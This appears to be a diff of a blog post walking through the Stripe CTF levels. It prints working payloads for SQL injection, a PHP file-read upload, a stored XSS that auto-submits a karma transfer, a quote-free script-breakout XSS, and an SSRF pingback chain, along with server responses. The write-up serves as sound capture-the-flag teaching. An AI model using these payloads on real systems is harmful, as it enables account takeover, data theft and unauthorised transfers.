@@ -52,7 +52,7 @@ PHP again.  Now we're getting into exploits I have, tragically, actually seen in
 
 So.  Yeah.
 
-###### my_avatar.php
+###### my\_avatar.php
 ```php
 <?php echo file_get_contents('../password.txt');
 ```
@@ -83,6 +83,7 @@ I didn't get it until I rephrased the question as: how can I trick this query in
 
 Oh, right.  New username:
 
+    :::text
     ' UNION SELECT (select id from users where username = 'bob'), '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae', '
 
 Which produces the final query:
@@ -135,6 +136,7 @@ Brilliant.
 
 That made the solution obvious: I created a new account with a password of:
 
+    :::html
     <form id="x" method="post" action="transfer"><input type="hidden" name="to" value="eevee2"><input type="hidden" name="amount" value="100000"></form><script>document.getElementById('x').submit();</script>
 
 Then I sent `karma_fountain` a single karma.  One minute later, the bot hit the page again, dutifully executed my XSS, and sent me ten thousand karma and the next password.
@@ -174,12 +176,14 @@ The real puzzle here is tricking the app into thinking `level05` has verified yo
 
 The first step is to try feeding the app to itself as the URL.  That produces:
 
+    :::text
     An unknown error occurred while requesting https://level05-2.stripe-ctf.com/user-abcdefghij/: 500 Internal Server Error
 
 The app is calling itself, but the second call has no pingback URL, so it gets confused and dies.  Hmm.
 
 Lucky for me, the app examines `params`, which is a combined hash of _both_ `GET` and `POST` data.  So I can make it not crash, at least, by feeding it `https://level05-2.stripe-ctf.com/user-vmscdesvlp/?pingback=www.google.com`.
 
+    :::text
     Remote server responded with: Host not allowed: www.google.com (allowed authentication hosts are /\.stripe-ctf\.com$/). Unable to authenticate as foo@level05-2.stripe-ctf.com.
 
 A valiant start.  I can keep this loop going as long as I please, but without an actual authentication somewhere, I won't get very far.  And that's where the level 2 servers come in.
@@ -193,6 +197,7 @@ I don't know why they mentioned "high ports" not being firewalled off; the above
 
 Upload this guy, try to authenticate as `https://level02-2.stripe-ctf.com/user-zlbgqlkyoe/uploads/pingback.php`, and I get:
 
+    :::text
     Remote server responded with: AUTHENTICATED.  Authenticated as foo@level02-2.stripe-ctf.com!
 
 Wrong server, but getting there.
@@ -212,6 +217,7 @@ Well, it's an uncommonly known quirk (and hilarious potential source of [exploit
 Now the solution is easy peasy.  In fact, I don't even have to do anything, because my `pingback.php` already contains a trailing newline.  The final URL
 is `https://level05-2.stripe-ctf.com/user-vmscdesvlp/?pingback=https://level02-2.stripe-ctf.com/user-zlbgqlkyoe/uploads/pingback.php` and we're off to the races.
 
+    :::text
     Remote server responded with: Remote server responded with: AUTHENTICATED . Authenticated as foo@level02-2.stripe-ctf.com!. Authenticated as foo@level05-2.stripe-ctf.com!
 
 The newline became a space in HTML land, of course.
@@ -259,6 +265,7 @@ JSON is structured, yes, but it doesn't know or care about HTML.  After all, the
 
 So I can just write a post like this:
 
+    :::html
     </script><script>alert("gotcha");
 
 And the JS will execute.
@@ -267,6 +274,7 @@ But wait!  I'm not allowed to send any data that contains quotes or apostrophes.
 
 Unless I make it:
 
+    :::html
     </script><script>alert(String.fromCharCode(103, 111, 116, 99, 104, 97));
 
 And that's basically the solution.  Take advantage of the provided jQuery to fetch `user_info` on my friend's behalf, extract the password, and post it as a message.  The final trick is remembering to somehow encode the password (as I'm told it also contains quotes); I just url-encoded the whole page and posted that.  Easy peasy.
@@ -278,6 +286,7 @@ Back to Python, but now we've moved on beyond websites: this is an API endpoint.
 
 I'm supposed to make a request for a privileged waffle, but requests are signed with my API key.  They look like this:
 
+    :::text
     count=1&lat=42.39561&user_id=5&long=-71.13051&waffle=dream|sig:30d0ca71b00bbe5e649628b8a7f2f88f90e17c27
 
 The signature is a SHA1 hash of my API key plus the rest of the request.
@@ -365,6 +374,7 @@ If the webhooks weren't revealing anything _directly_, it had to be a side chann
 
 As a last resort, talking out loud helps.  I was convinced the chunk servers' bound ports were still important, somehow.
 
+    :::text
     11:22 < subleq> i am completely stuck
     11:22 < eevee> i am also lacking inspiration
     11:23 < hm_> does chunk_Server ports matter ?
@@ -384,6 +394,7 @@ Ports, ports,  ports.  I better hurry if the server is already overloaded.  Port
 
 Ports...
 
+    :::text
     11:26 < eevee> wait
     11:26 < eevee> oh no
     11:26 < eevee> oh no i think i get it
